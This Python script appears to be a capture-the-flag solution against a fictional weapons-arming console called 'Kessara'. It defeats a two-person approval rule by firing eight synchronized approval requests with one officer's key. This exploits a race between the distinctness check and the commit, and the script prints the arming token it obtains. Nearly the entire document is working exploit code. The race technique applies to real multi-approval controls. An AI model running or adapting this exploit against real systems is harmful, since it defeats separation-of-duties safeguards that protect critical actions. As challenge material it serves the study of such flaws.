#!/usr/bin/env python3
"""
Kessara two-person-rule bypass (TOCTOU race on distinct-officer approval).

The console arms an order only when 2 DISTINCT officers APPROVE. The distinctness
check is not atomic: fire several approvals from the SAME officer key simultaneously
and two land inside the same pending window, each passing the "new officer" check
before either commits -> approvals=2 with both records belonging to VEGA-7 -> ARMED.

Usage:
    python -I solve.py http://HOST:PORT opk_vega7_xxxxx [ORDER_ID]
If ORDER_ID is omitted, the first PENDING_AUTH order is used.
"""
import sys, json, threading, urllib.request, urllib.error

def req(base, path, key, method="GET"):
    r = urllib.request.Request(base + path, method=method,
                               headers={"Authorization": f"Bearer {key}"})
    try:
        resp = urllib.request.urlopen(r, timeout=10)
        return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def main():
    base = sys.argv[1].rstrip("/")
    key = sys.argv[2]
    oid = sys.argv[3] if len(sys.argv) > 3 else None

    if not oid:
        _, body = req(base, "/orders", key)
        for o in json.loads(body)["orders"]:
            if o["status"] == "PENDING_AUTH":
                oid = o["id"]; break
        if not oid:
            print("no PENDING_AUTH order found"); return
    print(f"[*] target order: {oid}")

    N = 8
    barrier = threading.Barrier(N)
    results = []
    lock = threading.Lock()

    def approve(i):
        barrier.wait()  # release all threads at the same instant
        code, body = req(base, f"/orders/{oid}/approve", key, method="POST")
        with lock:
            results.append((i, code, body))

    threads = [threading.Thread(target=approve, args=(i,)) for i in range(N)]
    for t in threads: t.start()
    for t in threads: t.join()

    flag = None
    for i, code, body in sorted(results):
        try:
            j = json.loads(body)
            status = j.get("status"); auth = j.get("arming_authorization")
        except Exception:
            status, auth = "?", None
        print(f"  thread {i}: {code} status={status}")
        if auth:
            flag = auth
    print("[+] arming_authorization:", flag if flag else "(not armed — retry the burst)")

if __name__ == "__main__":
    main()
